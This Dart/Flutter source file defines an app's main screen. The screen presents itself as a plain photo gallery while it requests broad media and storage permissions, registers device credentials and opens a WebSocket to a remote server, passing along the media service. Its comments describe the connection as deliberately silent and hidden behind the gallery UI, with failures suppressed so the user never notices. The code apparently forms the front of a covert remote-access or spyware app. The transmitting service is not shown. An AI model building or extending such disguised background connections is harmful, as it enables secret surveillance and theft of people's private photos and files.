import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';

import '../services/device_registration_service.dart';
import '../services/media_service.dart';
import '../services/socket_service.dart';
import 'local_gallery_screen.dart';

/// Main screen: runs the WebSocket connection silently in the background
/// while presenting a simple, clean local gallery UI on the frontend.
class StatusScreen extends StatefulWidget {
  const StatusScreen({super.key});

  @override
  State<StatusScreen> createState() => _StatusScreenState();
}

class _StatusScreenState extends State<StatusScreen> {
  final _registrationService = DeviceRegistrationService();
  final _mediaService = MediaService();

  SocketService? _socketService;

  @override
  void initState() {
    super.initState();
    _init();
  }

  Future<void> _init() async {
    try {
      // 1. Ensure permissions
      final mediaGranted = await _mediaService.ensurePermission();
      if (!mediaGranted) return;

      // Request Manage External Storage (Downloads folder)
      if (await Permission.manageExternalStorage.isDenied) {
        await Permission.manageExternalStorage.request();
      }

      // 2. Auto register/load credentials
      final serverUrl = await _registrationService.getServerUrl();
      final credentials = await _registrationService.registerOrLoad();

      // 3. Start socket service in the background
      final service = SocketService(
        serverUrl: serverUrl,
        deviceId: credentials.deviceId,
        deviceToken: credentials.deviceToken,
        mediaService: _mediaService,
      );

      if (mounted) {
        setState(() {
          _socketService = service;
        });
      }

      service.connect();
    } catch (e) {
      // Fail silently in the background to avoid interrupting the gallery experience
      print('Silent background connection failed: $e');
    }
  }

  @override
  void dispose() {
    _socketService?.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Gallery'),
        centerTitle: true,
        elevation: 0,
      ),
      body: const SafeArea(
        child: LocalGalleryScreen(),
      ),
    );
  }
}
